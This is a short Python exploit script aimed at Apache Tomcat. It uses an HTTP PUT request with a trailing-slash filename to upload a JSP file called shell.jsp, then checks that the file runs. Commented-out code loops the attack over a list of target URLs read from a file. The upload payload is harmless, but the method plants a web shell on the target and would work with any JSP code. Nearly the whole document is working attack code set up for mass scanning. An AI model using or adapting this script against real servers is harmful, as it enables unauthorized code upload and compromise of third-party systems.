# coding:utf-8
import requests

class Exploit:

    def attack(self, url):
        response = requests.put(url+'/shell.jsp/', data='<%out.println("test");%>', timeout=10)
        r = requests.get(url+'/shell.jsp')
        if r.status_code == 200 and 'test' in r.text:
            return url+'/shell.jsp'


# print Exploit().attack('http://127.0.0.1:8081')
# with open('tomcat_all.txt') as f:
#     lines = f.readlines()
#
# for l in lines:
#     url = l.strip()
#     try:
#         ret = Exploit().attack(url)
#         if ret:
#             print ret
#         else:
#             print 'pass'
#     except Exception,e:
#         print e
#         pass